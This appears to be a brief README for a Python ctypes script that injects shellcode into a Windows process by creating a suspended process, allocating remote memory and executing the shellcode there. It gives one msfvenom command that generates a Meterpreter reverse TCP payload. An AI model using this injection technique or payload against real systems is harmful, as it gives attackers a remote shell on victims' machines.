# Windows Code Injection with Python and ctypes

This Python script demonstrates code injection into a Windows process using the ctypes library. The code covers various aspects, such as creating a suspended process, allocating remote memory, writing shellcode, and executing it in the target process.

# To customize the shellcode, generate your payload using a tool like MSFvenom:

  ```
    msfvenom -a x64 -p windows/x64/meterpreter_reverse_tcp lport=1337 lhost=127.0.0.1 -f py
  ```
